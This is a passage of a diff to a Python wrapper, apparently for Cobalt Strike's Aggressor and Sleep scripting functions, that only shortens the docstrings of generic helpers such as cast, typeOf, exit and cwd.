+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('command', args, fork=fork)
@@ -5983,9 +5971,7 @@ def command(*args, fork=False):
 
 def cast(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('cast', args, fork=fork)
@@ -5993,9 +5979,7 @@ def cast(*args, fork=False):
 
 def casti(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('casti', args, fork=fork)
@@ -6003,9 +5987,7 @@ def casti(*args, fork=False):
 
 def typeOf(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('typeOf', args, fork=fork)
@@ -6013,9 +5995,7 @@ def typeOf(*args, fork=False):
 
 def exit(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('exit', args, fork=fork)
@@ -6023,9 +6003,7 @@ def exit(*args, fork=False):
 
 def systemProperties(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('systemProperties', args, fork=fork)
@@ -6033,9 +6011,7 @@ def systemProperties(*args, fork=False):
 
 def cwd(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('cwd', args, fork=fork)
